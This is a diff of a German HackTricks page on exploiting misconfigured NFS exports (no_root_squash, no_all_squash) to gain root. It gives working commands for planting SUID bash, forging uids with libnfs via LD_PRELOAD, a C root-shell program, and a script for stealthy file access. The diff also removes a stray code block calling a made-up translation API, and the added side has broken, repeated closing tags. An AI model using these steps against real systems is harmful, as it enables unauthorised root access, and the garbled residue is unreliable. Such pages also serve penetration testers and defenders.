@@ -1,31 +1,37 @@
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
-
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
+{% endhint %}
 
 
-Lesen Sie die Datei _ **/etc/exports** _, wenn Sie ein Verzeichnis finden, das als **no\_root\_squash** konfiguriert ist, können Sie darauf als **Client zugreifen** und in dieses Verzeichnis schreiben, als wären Sie der lokale **root** der Maschine.
+Lese die _ **/etc/exports** _ Datei. Wenn du ein Verzeichnis findest, das als **no\_root\_squash** konfiguriert ist, kannst du **darauf zugreifen** **als Client** und **in dieses Verzeichnis schreiben**, **als ob** du der lokale **root** der Maschine wärst.
 
-**no\_root\_squash**: Diese Option gibt dem Root-Benutzer auf dem Client die Berechtigung, Dateien auf dem NFS-Server als Root zu öffnen. Dies kann zu schwerwiegenden Sicherheitsproblemen führen.
+**no\_root\_squash**: Diese Option gibt im Grunde dem root-Benutzer auf dem Client die Berechtigung, Dateien auf dem NFS-Server als root zuzugreifen. Und das kann zu ernsthaften Sicherheitsproblemen führen.
 
-**no\_all\_squash:** Diese Option ist ähnlich wie die Option **no\_root\_squash**, gilt jedoch für **nicht-root-Benutzer**. Stellen Sie sich vor, Sie haben eine Shell als Benutzer "nobody"; überprüfen Sie die Datei /etc/exports; die Option no\_all\_squash ist vorhanden; überprüfen Sie die Datei /etc/passwd; emulieren Sie einen nicht-root-Benutzer; erstellen Sie eine SUID-Datei als dieser Benutzer (durch Mounten mit NFS). Führen Sie die SUID-Datei als Benutzer "nobody" aus und werden Sie ein anderer Benutzer.
+**no\_all\_squash:** Dies ist ähnlich wie die Option **no\_root\_squash**, gilt jedoch für **Nicht-Root-Benutzer**. Stell dir vor, du hast eine Shell als Benutzer nobody; hast die /etc/exports Datei überprüft; die Option no\_all\_squash ist vorhanden; überprüfe die /etc/passwd Datei; emuliere einen Nicht-Root-Benutzer; erstelle eine SUID-Datei als dieser Benutzer (indem du NFS verwendest). Führe die SUID als Benutzer nobody aus und werde ein anderer Benutzer.
 
-# Privilege Escalation
+# Privilegieneskalation
 
 ## Remote Exploit
 
-Wenn Sie diese Schwachstelle gefunden haben, können Sie sie ausnutzen:
+Wenn du diese Schwachstelle gefunden hast, kannst du sie ausnutzen:
 
-* **Mounten Sie dieses Verzeichnis** auf einer Client-Maschine und **kopieren Sie als Root** in das gemountete Verzeichnis die Datei **/bin/bash** und geben Sie ihr **SUID-Rechte**. Führen Sie dann von der Opfermaschine aus diese Bash-Datei aus.
+* **Montiere dieses Verzeichnis** auf einer Client-Maschine und **kopiere als root** die **/bin/bash** Binärdatei in den gemounteten Ordner und gib ihr **SUID**-Rechte, und **führe von der Opfer**-Maschine diese Bash-Binärdatei aus.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -38,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **Das Einhängen dieses Verzeichnisses** auf einer Client-Maschine und **als Root das Kopieren** unserer kompilierten Payload in den eingehängten Ordner, der die SUID-Berechtigung ausnutzt, ihm SUID-Rechte gibt und **von der Opfermaschine aus** diese Binärdatei ausführt (hier finden Sie einige [C SUID-Payloads](payloads-to-execute.md#c)).
+* **Das Verzeichnis** auf einem Client-Rechner einbinden und **als root** unser kompiliertes Payload, das die SUID-Berechtigung ausnutzt, in den eingebundenen Ordner kopieren, ihm **SUID**-Rechte geben und **von der Opfer**-Maschine diese Binärdatei ausführen (hier finden Sie einige [C SUID-Payloads](payloads-to-execute.md#c)).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -55,19 +61,19 @@ cd <SHAREDD_FOLDER>
 ## Lokaler Exploit
 
 {% hint style="info" %}
-Beachten Sie, dass Sie, wenn Sie eine **Verbindung von Ihrem Gerät zum Opfergerät herstellen können, immer noch die Remote-Version verwenden können, um diesen Privileg-Eskalationsangriff durchzuführen, indem Sie die erforderlichen Ports tunneln**.\
-Der folgende Trick gilt für den Fall, dass die Datei `/etc/exports` **eine IP-Adresse angibt**. In diesem Fall können Sie in keinem Fall den **Remote-Exploit** verwenden und müssen diesen Trick missbrauchen.\
-Eine weitere Voraussetzung für das Funktionieren des Exploits ist, dass **der Export in `/etc/export` die `insecure`-Flag verwendet**.\
---_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--
+Beachten Sie, dass Sie, wenn Sie einen **Tunnel von Ihrem Rechner zum Zielrechner erstellen können, die Remote-Version weiterhin verwenden können, um diese Privilegieneskalation durch Tunneln der erforderlichen Ports auszunutzen**.\
+Der folgende Trick gilt, falls die Datei `/etc/exports` **eine IP angibt**. In diesem Fall **werden Sie auf keinen Fall** die **Remote-Exploit** verwenden können und müssen **diesen Trick ausnutzen**.\
+Eine weitere erforderliche Bedingung, damit der Exploit funktioniert, ist, dass **der Export in `/etc/export`** **das `insecure`-Flag verwenden muss**.\
+\--_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--
 {% endhint %}
 
-## Grundlegende Informationen
+## Grundinformationen
 
-Das Szenario beinhaltet die Ausnutzung eines eingebundenen NFS-Shares auf einem lokalen Gerät, wobei eine Schwachstelle in der NFSv3-Spezifikation ausgenutzt wird, die es dem Client ermöglicht, seine uid/gid anzugeben und möglicherweise unbefugten Zugriff zu ermöglichen. Die Ausnutzung beinhaltet die Verwendung von [libnfs](https://github.com/sahlberg/libnfs), einer Bibliothek, die das Fälschen von NFS-RPC-Aufrufen ermöglicht.
+Das Szenario beinhaltet das Ausnutzen eines gemounteten NFS-Teils auf einem lokalen Rechner, wobei eine Schwachstelle in der NFSv3-Spezifikation ausgenutzt wird, die es dem Client ermöglicht, seine uid/gid anzugeben, was potenziell unbefugten Zugriff ermöglicht. Der Exploit beinhaltet die Verwendung von [libnfs](https://github.com/sahlberg/libnfs), einer Bibliothek, die das Fälschen von NFS-RPC-Aufrufen ermöglicht.
 
 ### Kompilieren der Bibliothek
 
-Die Schritte zur Kompilierung der Bibliothek können je nach Kernel-Version angepasst werden. In diesem speziellen Fall wurden die fallocate-Syscalls auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
+Die Schritte zur Kompilierung der Bibliothek können je nach Kernelversion Anpassungen erfordern. In diesem speziellen Fall wurden die fallocate-Systemaufrufe auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
 ```bash
 ./bootstrap
 ./configure
@@ -76,16 +82,16 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### Durchführung des Exploits
 
-Der Exploit beinhaltet das Erstellen eines einfachen C-Programms (`pwn.c`), das die Privilegien auf Root-Ebene erhöht und dann eine Shell ausführt. Das Programm wird kompiliert und die resultierende Binärdatei (`a.out`) wird auf dem Share mit suid root platziert, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:
+Der Exploit besteht darin, ein einfaches C-Programm (`pwn.c`) zu erstellen, das die Berechtigungen auf root erhöht und dann eine Shell ausführt. Das Programm wird kompiliert, und die resultierende Binärdatei (`a.out`) wird mit suid root auf dem Share platziert, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:
 
-1. **Kompilieren des Exploit-Codes:**
+1. **Kompilieren Sie den Exploit-Code:**
 ```bash
 cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Platzieren des Exploits auf dem Share und Ändern der Berechtigungen durch Fälschen der uid:**
+2. **Platzieren Sie den Exploit auf dem Share und ändern Sie seine Berechtigungen, indem Sie die uid fälschen:**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -93,14 +99,14 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs:
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
 
-3. **Ausführen des Exploits, um Root-Privilegien zu erlangen:**
+3. **Führen Sie den Exploit aus, um root-Rechte zu erlangen:**
 ```bash
 /mnt/share/a.out
 #root
 ```
 
-## Bonus: NFShell für unauffälligen Dateizugriff
-Sobald Root-Zugriff erlangt wurde, wird zum Interagieren mit dem NFS-Share ohne Änderung der Besitzverhältnisse (um keine Spuren zu hinterlassen) ein Python-Skript (nfsh.py) verwendet. Dieses Skript passt die uid an, um mit Dateien auf dem Share ohne Berechtigungsprobleme interagieren zu können:
+## Bonus: NFShell für stealthy Datei-Zugriff
+Sobald root-Zugriff erlangt wurde, wird ein Python-Skript (nfsh.py) verwendet, um mit dem NFS-Share zu interagieren, ohne den Besitz zu ändern (um keine Spuren zu hinterlassen). Dieses Skript passt die uid an die des zuzugreifenden Files an, sodass die Interaktion mit Dateien auf dem Share ohne Berechtigungsprobleme möglich ist:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -119,47 +125,31 @@ uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-```python
-import requests
-
-url = "https://api.openai.com/v1/translate/eng-deu"
-
-headers = {
-    "Authorization": "Bearer YOUR_API_KEY",
-    "Content-Type": "application/json"
-}
-
-data = {
-    "text": "The following is content from a hacking book about hacking techniques.",
-    "source_language": "en",
-    "target_language": "de"
-}
-
-response = requests.post(url, headers=headers, json=data)
-translation = response.json()["translations"][0]["translation"]
-
-print(translation)
-```
-
-This will translate the English text to German using the OpenAI Translate API. Make sure to replace `YOUR_API_KEY` with your actual API key.
+Führen Sie aus wie:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-## Referenzen
-* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)
-
+{% hint style="success" %}
+Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Unterstützen Sie HackTricks</summary>
 
-Andere Möglichkeiten, HackTricks zu unterstützen:
+* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.
 
-* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
-* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
-
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
+</details>
+{% endhint %}
 </details>
